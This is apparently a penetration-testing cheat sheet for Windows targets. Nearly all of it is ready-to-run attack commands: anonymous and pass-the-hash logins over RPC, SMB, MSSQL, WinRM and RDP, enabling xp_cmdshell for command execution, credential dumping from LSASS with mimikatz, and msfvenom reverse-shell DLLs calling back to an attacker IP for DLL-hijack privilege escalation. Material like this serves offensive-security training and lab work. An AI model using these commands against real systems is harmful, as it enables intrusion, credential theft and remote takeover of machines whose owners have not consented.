# Windows

### Links

Table of Contents
=================

* [Windows](#windows)
      * [Links](#links)
   * [Windows tools](#windows-tools)
      * [Useful information](#useful-information)
      * [PrivescCheck - Find privilege escalation vectors](#privesccheck---find-privilege-escalation-vectors)
      * [WinPEAS - Alternative tool,](#winpeas---alternative-tool)
   * [RPC](#rpc)
      * [rpcclient](#rpcclient)
   * [SMB](#smb)
      * [smbclient](#smbclient)
   * [MSSQL](#mssql)
      * [mssqlclient](#mssqlclient)
   * [WinRM](#winrm)
      * [Evil-WinRM](#evil-winrm)
   * [RDP](#rdp)
      * [xfreerdp](#xfreerdp)
   * [Privilege](#privilege)
      * [Check privileges of current user](#check-privileges-of-current-user)
      * [SeDebugPrivilege](#sedebugprivilege)
   * [Missing_DLL](#missing_dll)
      * [Wlanapi.dll](#wlanapidll)
      * [SprintCSP.dll](#sprintcspdll)

<!-- Created by https://github.com/ekalinin/github-markdown-toc -->

## Windows tools

### Useful information

- Blank LMhash : `aad3b435b51404eeaad3b435b51404ee`

### PrivescCheck - Find privilege escalation vectors

source : https://github.com/itm4n/PrivescCheck

### WinPEAS - Alternative tool, 
useful to find interesting info alongside privilege escalation vectors.  
source : https://github.com/carlospolop/PEASS-ng/


## RPC

### rpcclient

1. Connect to a RPC service as an anonymous user

```bash
rpcclient -U "%" X.X.X.X
```

2. Connect to a RPC service as a user

```bash
rpcclient -U "<user>%<password>" X.X.X.X
```

3. Useful rpc commands

<details>
  <summary>Users enumeration</summary>

```bash
querydispinfo # List users
enumdomusers # List users
queryuser <0xrid> # User details
queryusergroups <0xrid> # User groups
lookupnames <username> # SID
queryuseraliases [builtin|domain] <sid> # Aliases
```

</details>

<details>
  <summary>Group enumeration</summary>

```bash
enumdomgroups # List groups
querygroup  <0xrid> # Group details
querygroupmem  <0xrid> # Group members
```

</details>

<details>
  <summary>Domains enumeration</summary>

```bash
enumdomains # List domains
lsaquery # Get SID
querydominfo # Domain info:
```

</details>
<details>
  <summary>Shares enumeration</summary>

```bash
netshareenumall # Enumerate all available shares
netsharegetinfo <share> # Info about a share
```

</details>

<details>
  <summary>More SIDs</summary>

```bash
lookupnames <username> # Find SIDs by name
lsaenumsid # Find more SIDs
lookupsids <sid> # RID cycling (check more SIDs)
```

</details>



## SMB

### smbclient

1. map the share

```bash
smbmap -H X.X.X.X
```

2. Connect to a SMB service as an anonymous user

```bash
smbclient -L //X.X.X.X
```

3. Connect to a SMB service as a user

```bash
smbclient -L //X.X.X.X -U "<user>%<password>"
```

4. Connect to a SMB service as a user and list files

```bash
smbclient //X.X.X.X -U "<user>%<password>"
```

## MSSQL

### mssqlclient

1. Connect to a MSSQL service as an anonymous user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U sa
```

2. Connect to a MSSQL service as a user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -P <password>
```

2. Connect to a MSSQL service as a user with the hash

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -hashes <LM>:<NT>
```

4. Useful mssql commands

<details>
  <summary>Users enumeration</summary>

```bash
SELECT name FROM master..syslogins
```

</details>

<details>
  <summary>Database enumeration</summary>

```bash
SELECT name FROM master..sysdatabases
```

</details>

<details>
  <summary>Remote Command execution</summary>

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

</details>

## WinRM

### Evil-WinRM

source : `sudo apt install evil-winrm`

1. Connect to a WinRM service as a user

```bash
evil-winrm -i X.X.X.X -u <user> -p <password>
```

2. Connect to a WinRM service as a user with the hash

```bash
evil-winrm -i X.X.X.X -u <user> -H <NThash>
```

## RDP

### xfreerdp

1. Connect to a RDP service as a user

```bash
xfreerdp /u:<user> /p:<password> /v:X.X.X.X
```

2. Connect to a RDP service as a user with the hash

```bash
xfreerdp /u:<user> /pth:<NThash> /v:X.X.X.X
```

## Privilege

### Check privileges of current user

```powershell
whoami /priv
```

### SeDebugPrivilege

How to privilege escalation with SeDebugPrivilege :

1. Dump the Administrator hash with mimikatz or meterpreter

Method 1 with mimikatz :

```powershell
.\mimikatz.exe
privilege::debug
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Method 2 with meterpreter :
[how to spawn a meterpreter shell](Tools.md#meterpreter)

```powershell
hashdump
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c4c883121a2f63ec6b4312ba7572689b:::
```

1. With the hash of the administrator, use [`psexec`](Windows.md#psexec) from impacket or [`evil-winrm`](Windows.md#evil-winrm) to get a shell as administrator.

Note : you may need to set a [chisel](Tools.md#chisel) tunnel to exec those commands.

```bash
evil-winrm -i X.X.X.X -u Administrator -H c4c883121a2f63ec6b4312ba7572689b
impacket-psexec Administrator@X.X.X.X -hashes aad3b435b51404eeaad3b435b51404ee:c4c883121a2f63ec6b4312ba7572689b
```

## Missing_DLL

Some Windows services try to use dlls that are missing. If the user has write permissions on a system-wide PATH folder, it is possible to execute command as System.

### Wlanapi.dll

[Get NetManTrigger code](https://itm4n.github.io/windows-server-netman-dll-hijacking/#2020-04-13-update-dealing-with-the-interactive-restriction)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=10.10.14.8 LPORT=1337 -o wlanapi.dll
./RunasCs.exe <user> <password> "./NetManTrigger.exe"
```

### SprintCSP.dll

[Get RpcClient sln project](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=10.10.14.8 LPORT=1337 -o SprintCSP.dll
./RpcClient.exe
```
